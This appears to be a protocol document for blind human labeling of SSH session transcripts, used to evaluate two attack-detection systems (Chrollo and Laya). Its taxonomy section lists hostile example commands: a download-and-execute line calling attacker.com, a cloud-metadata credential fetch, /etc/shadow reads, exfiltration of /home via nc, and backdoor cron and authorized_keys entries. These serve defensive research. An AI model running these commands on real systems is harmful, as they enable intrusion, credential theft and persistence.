# Independent Labeling Protocol

Purpose: create a reproducible, model-free labeled evaluation set for the
Chrollo-vs-Laya scientific study. This is the weak link in the current evidence
chain and is treated as such here.

## 1. Goal

Produce independent malicious/benign (and finer attack-kind) labels for SSH
command/session evidence **without** using:
- Chrollo predictions
- Laya predictions
- synthetic labels
- LLM proxy labels
- scorer decisions
- filenames or metadata that reveal the class

## 2. Candidate sources

Current defensible sources in this repository:
- `data/cowrie_logs/` (historical controlled Cowrie honeypot sessions)
- `data/real_linux_transcripts.json` (real administration-style transcripts)
- `data/sessions/*.jsonl` (existing SSH session transcripts with attacker_input events)

The v2 pipeline produces:
- `results/laya_research/independent_label_candidates_v2.json`
- `results/laya_research/blind_annotation_packet_v2.json`
- `results/laya_research/annotation_manifest_v2.json`
- `results/laya_research/blind_annotation_confirmatory.json`
- `results/laya_research/rater_packets/r1.json`, `r2.json`, `r3.json` (+ CSV equivalents)
- `results/laya_research/confirmatory_frozen_predictions.jsonl`

Provenance metadata is kept only in the private manifest
(`results/laya_research/confirmatory_subset_manifest.json`).

## 3. What the blinded packet must NOT contain

- Chrollo output
- Laya output
- existing automated labels
- expected labels
- filenames revealing class
- experiment-arm names
- model confidence
- synthetic truth metadata

Each record in `blind_annotation_confirmatory.json` contains only:
- opaque case ID
- evidence
- optional minimal preceding context needed to interpret the action

No source-family, honeypot provenance, model, prediction, or confidence information
appears in any rater-visible artifact.

## 4. Annotation taxonomy (operational definitions)

Label **what the recorded evidence itself supports**. Do not infer intent that the
transcript does not show. Every category below is defined by observable behavior,
not by who the actor "probably" is.

### BENIGN
Routine, defensively-scoped administration or information lookup with no attempt
to conceal activity, exfiltrate data, gain unauthorized access, or alter system
state in privileged/security-relevant ways.
Examples (NOT in the evaluation set):
- `df -h`, `free -m`, `uname -a`, `cat /etc/os-release`
- `ls /var/log | head -n 20`
- `docker ps` for resource checks

### RECON
Observation/enumeration of the environment that reasonably precedes exploitation:
network sweeps, service/port discovery, account or system-info gathering, publicly
exposed infrastructure probing.
Examples (NOT in the evaluation set):
- `nmap -sV 10.0.0.0/24`
- `netstat -an` plus external scanning in one stream
- a burst of `whoami`, `id`, `uname -a`, `ps aux` from a fresh unauthenticated context

### SUSPICIOUS
Behavior that is not clearly benign and not a direct attack step — mixed/ambiguous
activity that a security analyst would flag for investigation (e.g., reading
non-critical sensitive-looking files, unusual scripted probing, obfuscated or
unfamiliar commands)
Examples (NOT in the evaluation set):
- hashed/base64 payload that is not observed to execute
- repeated queries about internal paths with no data read
- combined commands that are neither clearly admin nor clearly adversarial

### EXPLOITATION
Evidence of an active attempt to abuse a vulnerability — buffer overflow,
remote code execution, injection, known-CVE exploitation, malicious binary
download-and-execute, or a payload designed to grant unauthorized control.
Examples (NOT in the evaluation set):
- `wget http://attacker.com/shell.elf -O /tmp/s && chmod +x /tmp/s && /tmp/s`
- `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- SQL/SSRF/command-injection payload observed being used against a service

### PRIVILEGE_ESCALATION
Active use of a technique to gain elevated privileges beyond the current
level (sudo/SUID abuse, kernel exploit, container breakout, or use of a
cached/unauthorized credential to run a privileged operation).
Examples (NOT in the evaluation set):
- `sudo cat /etc/shadow` by a non-root user without a stated admin role
- `find / -perm -4000 2>/dev/null` followed by sudo binary abuse
- attempt to abuse `pkexec` or a set-uid helper

### DATA_ACCESS
Reading, collecting, staging, or exfiltrating data (credentials, tokens, private
keys, databases, PII), regardless of whether it is the final goal.
Examples (NOT in the evaluation set):
- `cat /etc/shadow`, `scp /etc/passwd user@10.0.0.10:/tmp/`
- `env | grep -i api_key`
- `tar czf - /home/ | nc 10.0.0.100 4444`

### PERSISTENCE
Creating durable footholds: cron jobs, systemd services, ssh authorized_keys
modifications, startup scripts, or scheduled tasks that appear intended to
survive reboots.
Examples (NOT in the evaluation set):
- `echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys`
- `(crontab -l; echo '* * * * * /tmp/backdoor') | crontab -`
- `systemctl enable backdoor.service`

### OTHER_ATTACK
Any spearphishing/impact/disruption/C2/exfiltration-attribution behavior that
does not fit above. Includes denial of service, destructive impact, clear C2
channel setup, evidence-supplying but not-yet-local actions that are obviously
adversarial.
Examples (NOT in the evaluation set):
- flooding with SYN packets when no other context exists
- shutdown/reboot-flood pattern with no administrative reason
- skeleton/impact ransomware note present in a staging folder

### UNCERTAIN
Use when the evidence is genuinely insufficient (e.g., insufficient length, no
clear behavior, isolated token like a bare `true`/`exit`, syntax errors, or the
transcript stops mid-action with no observable effect).
UNCERTAIN is NOT allowed to be used as a default fallback to avoid judgment;
if the evidence points in one direction, choose the closest category instead.

## 5. Annotation rules for raters

1. Label **what the transcript shows**, not what intent an actor "probably" had.
2. Do not infer that the interaction came from a honeypot; do not use source
   knowledge to decide a class.3. Ignore realism/style/wording and classify the behavior itself. Natural-
   language technique phrasing (e.g., "Explain T1195.002 supply chain
   compromise") is a knowledge query, not an executed attack — treat those as
   BENIGN or UNCERTAIN based on context, not as the referenced technique being
   performed.
4. Do not guess whether the interaction came from a honeypot during labeling.
5. Use UNCERTAIN only when the evidence itself is insufficient.
6. Do not silently collapse UNCERTAIN — it will be reported separately and
   excluded from the primary binary metric.
7. Ignore filename, session id, or metadata; the packet is designed to withhold
   those.
8. Binary projection (applied later by the analysis pipeline, not shown here to
   reduce anchoring):
   - BENIGN → NEGATIVE
   - RECON, SUSPICIOUS, EXPLOITATION, PRIVILEGE_ESCALATION, DATA_ACCESS,
     PERSISTENCE, OTHER_ATTACK → POSITIVE
   - UNCERTAIN → excluded from the primary binary metric, reported separately.

## 6. Blinding and leakage control

Raters receive:
- randomized item order (deterministic per rater seed)
- opaque case IDs
- evidence and optional context only

Raters do not receive provenance, model outputs, or truth metadata.

Leakage screening was run before the confirmatory packet was frozen:
- `results/laya_research/leakage_review_v2.json`
- 0 confirmed label/prediction/experiment leakage items remain.
- Generic words (`true`, `provider`) were manually reviewed and marked safe;
  "Cowrie" provenance was removed from rater-visible context.

## 7. Annotation workflow

1. Build candidate pool v2 (deterministic).
2. Run leakage screening (0 confirmed items).
3. Build the confirmatory blind packet `blind_annotation_confirmatory.json`.
4. Generate three blinded rater packets `r1.json`, `r2.json`, `r3.json`
   (+ CSV equivalents), independently shuffled per rater.
5. Raters annotate offline.
6. Store per-rater labels under `results/laya_research/rater_labels/<rater>.json`.
7. Validate rater file integrity. The analysis pipeline enforces this and
   refuses to run unless each rater file (a) uses the exact `labels` schema
   written by `laya_blind_annotation_workflow.py` with the matching
   `rater_id`, (b) carries its own distinct `completed_at` timestamp
   (identical timestamps across raters indicate programmatically generated
   files), and (c) labels **every** confirmatory case (partial sets are
   refused so the evaluation set cannot silently shrink). Pre-existing
   AI-rater files in this directory do not satisfy these gates and are not
   treated as human labels.
8. Compute agreement and adjudication (see §8).
9. Freeze the final held-out set.

No human labels have been supplied yet.

Examples are provided under `results/laya_research/annotation_examples/` and are
explicitly NOT members of the evaluation set.

## 8. Adjudication contract

Primary label rule:
- majority vote where at least 2/3 agree

Disagreement rule:
- retain all original rater labels
- flag for adjudication
- never rewrite original rater files

Agreement measures:
- raw agreement
- pairwise agreement
- Fleiss kappa or another appropriate multi-rater statistic
- percentage UNCERTAIN
- category-specific disagreement

Acceptance rule:
- proceed to primary comparison if enough adjudicated cases remain and agreement
  is defensible
- otherwise classify the evaluation as exploratory

This contract is set before seeing model scores.

## 9. Frozen prediction/evaluation design

Before labels exist, freeze the prediction/evaluation machinery.

For every case the frozen runner must output (in
`results/laya_research/confirmatory_frozen_predictions.jsonl`):
- opaque case ID
- Chrollo conclusion
- Chrollo confidence
- Laya SIGNAL/NO_SIGNAL status
- Laya answer
- Laya latency
- disagreement indicator

Ground truth is joined only after predictions are frozen. The skeleton used here
is deliberately conservative and does not invent a combination rule after seeing
outcomes. A combination rule must be declared explicitly before reporting C/D
results in a post-hoc/exploratory sensitivity analysis.

## 10. Known limitations

- Many candidates in the v2 pool are shallow single-line prompts rather than
  executed attack activity; the confirmatory subset necessarily contains a spread
  of context-depth.
- Cowrie provenance is not independent malicious/benign ground truth.
- Real-linux provenance is not independent benign ground truth.
- Session-file provenance is only a weak signal and must be interpreted carefully.
- No human labels exist yet; evaluation is therefore pending.
- UNCERTAIN labels are excluded from the primary binary metric and reported
  separately.

## 11. Artifacts

- `results/laya_research/test_execution_provenance.json`
- `results/laya_research/failure_inventory.json`
- `results/laya_research/candidate_quality_audit.jsonl`
- `results/laya_research/leakage_review_v2.json`
- `results/laya_research/deduplication_clusters.json`
- `results/laya_research/confirmatory_subset_manifest.json`
- `results/laya_research/confirmatory_case_ids.txt`
- `results/laya_research/blind_annotation_confirmatory.json`
- `results/laya_research/rater_packets/r1.json`, `r2.json`, `r3.json` (+ `.csv`)
- `results/laya_research/confirmatory_frozen_predictions.jsonl`
- `results/laya_research/gating_preregistration.json`
- `results/laya_research/independent_label_candidates_v2.json`
- `results/laya_research/blind_annotation_packet_v2.json`
- `results/laya_research/annotation_manifest_v2.json`
- `results/laya_research/rater_templates/r1.json`, `r2.json`, `r3.json`
- `results/laya_research/rater_labels/` (created, empty until labels arrive)
- `results/laya_research/annotation_examples/README.md`
- `scripts/laya_candidate_pool_v2.py`
- `scripts/laya_blind_annotation_workflow.py`
- `scripts/laya_manifest_consistency_check.py`
- `scripts/laya_frozen_runner.py`
- `scripts/laya_freeze_and_reboot.sh`
- `scripts/laya_confirmatory_selection.py`
- `scripts/laya_leakage_review_v2.py`
- `scripts/laya_candidate_quality_audit.py`
- `scripts/laya_candidate_audit.py`
- `scripts/laya_confirmatory_analysis.py` (refuses to run without real labels)
- `tests/unit/test_laya_confirmatory_analysis.py`
